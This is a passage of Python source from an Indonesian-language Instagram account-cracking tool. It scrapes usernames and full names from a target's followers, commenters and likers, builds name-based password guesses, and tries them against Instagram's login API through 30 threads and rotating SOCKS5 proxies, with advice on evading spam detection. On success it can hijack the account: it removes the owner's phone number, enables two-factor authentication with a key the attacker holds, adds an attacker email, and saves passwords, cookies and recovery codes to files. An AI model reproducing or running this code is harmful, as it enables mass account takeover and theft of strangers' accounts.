                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '02' or query == '2':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Following(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '03' or query == '3':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    try: self.Dump_Search(self.username, cookie)
                    except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '04' or query == '4':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Komentar(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '05' or query == '5':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Likers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '06' or query == '6':
            try:
                Console(width=65).print(Panel('[bold green]01[bold white]. Chek Result OK\n[bold green]02[bold white]. Chek Result 2F\n[bold green]03[bold white]. Chek Result CP',style='bold grey50'), justify='center')
                choose = Console().input(""[bold grey50]   ╰─> "")
                if choose =='01' or choose =='1':
                    try:
                        file = os.listdir('/sdcard/OK')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic green]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File OK) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File OK, Masukan Nama File, Misalnya : [bold green]OK-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='02' or choose =='2':
                    try:
                        file = os.listdir('/sdcard/2F')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File 2F) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File 2F, Masukan Nama File, Misalnya : [bold red]2F-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='03' or choose =='3':
                    try:
                        file = os.listdir('/sdcard/CP')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic yellow]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File CP) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File CP, Masukan Nama File, Misalnya : [bold yellow]CP-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                else:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                    exit()   
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '07' or query == '7':
            try: Facebook()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                              
        elif query == '00' or query == '0':
            try: self.Remove_Cookie()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
        else:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()               
                  
    def Dump_Search(self, username, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={self.username}&rank_token=0.11856792192547738&include_reel=true',headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie':cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(self.username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Search(self.username, cookie)
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass       
            
    def Dump_Followers(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/followers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Followers(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Following(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/following/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Following(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Komentar(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/comments/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['comments']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass
            
    def Dump_Likers(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/likers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Result(self, result, isi):
        if result in ('1','01'):
            for buka in open(f'/sdcard/OK/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f'\r╭ auth secure account',style='green'); true.add(f""status two {buka.split('|')[6]}""); true.add(f""secret key {buka.split('|')[7]}""); true.add(f""pemulihan {buka.split('|')[8]}""); true.add(f""telephone {buka.split('|')[9]}""); true.add(f""add email {buka.split('|')[10]}""); true.add(f""web email {buka.split('|')[11]}""); true = tree.add(f""Cookie {buka.split('|')[12]}""); tree.add(""Success cek in Result OK""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f""Cookie {buka.split('|')[6]}""); tree.add(""Success cek in Result OK""); printz(tree)
                    
        elif result in ('2','02'):
            for buka in open(f'/sdcard/2F/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='red'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                
        elif result in ('3','03'):
            for buka in open(f'/sdcard/CP/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='yellow'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result CP""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result CP""); printz(tree)   
            
    def Methode(self):
        try:
            self.Meterans.append(Panel(f'[bold green]01.[bold white] Methode [bold green]Api V1\n[bold green]02.[bold white] Methode [bold green]Api Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Api) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50', subtitle = ""╭─────"", subtitle_align = ""left""))
            self.Meterans.append(Panel(f'[bold green]03.[bold white] Methode [bold green]Ajax V1\n[bold green]04.[bold white] Methode [bold green]Ajax Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Ajax) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50'))
            Console().print(Columns(self.Meterans))
            Methode_Login = Console().input(""[bold grey50]   ╰─> "")
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Apakah Anda Ingin Menggunakan Auto Amankan Data Akun OK (y/t)"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Secure Akun) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Secure_Akun = Console().input(""[bold grey50]   ╰─> "")
            if Secure_Akun =='y' or Secure_Akun =='ya':
                self.amankan_akun.append('ya')
            self.Exec_Methode(Methode_Login)
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()                
        
    def Simpan_Result(self):
        self.waktu = datetime.datetime.now()
        self.bulan = ['Januari', 'Februari', 'Maret', 'April',  'Mei', 'Juni', 'Juli','Agustus', 'September', 'Oktober', 'November', 'Desember']
        return(f'OK-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}', f'2F-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}',f'CP-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}')
        
    def Password(self, fullname):
        self.one = []
        for nama in fullname.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
            else: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
        
    def Exec_Methode(self, Methode_Login):
        try:
            self.result_ok,self.result_two,self.result_cp = self.Simpan_Result()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[bold green]•[bold white] Result OK Tersimpan Di Folder : [bold green]/sdcard/OK/{self.result_ok}\n[bold red]•[bold white] Result 2F Tersimpan Di Folder : [bold red]/sdcard/2F/{self.result_two}\n[bold green]•[bold white] Result CP Tersimpan Di Folder : [bold yellow]/sdcard/CP/{self.result_cp}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Result Instagram) [bold green]<[bold yellow]<[bold red]<""))
            Console(width = 65).print(Panel('[bold white]Mainkan Mode Pesawat Setiap 200 Looping Agar Terhindar Spam!',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Warning Spam) [bold green]<[bold yellow]<[bold red]<',style='white'))
            with ThreadPoolExecutor(max_workers=30) as V:
                for Username_And_Fullname in dump:
                    username, fullname = Username_And_Fullname.split('<=>')
                    password = self.Password(fullname)
                    if Methode_Login in ('1'):
                        V.submit(self.ExecApi, username,password)
                    elif Methode_Login in ('2'):
                        V.submit(self.ExecApi_Threads, username,password)
                    elif Methode_Login in ('3'):
                        V.submit(self.ExecAjax, username,password)
                    elif Methode_Login in ('4'):
                        V.submit(self.ExecAjax_Threads, username,password)
                    else: V.submit(self.ExecApi, username,password)
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Kamu Telah Mendapatkan [bold green]{self.success}[bold white] Hasil OK, [bold yellow]{self.chekpoint}[bold white] Hasil Checkpoint Dan [bold red]{self.faktor}[bold white] Hasil Two Faktor, Dari {len(dump)} Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Selesai) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()  
        
    def ExecApi(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://i.instagram.com/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'i.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://i.instagram.com/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
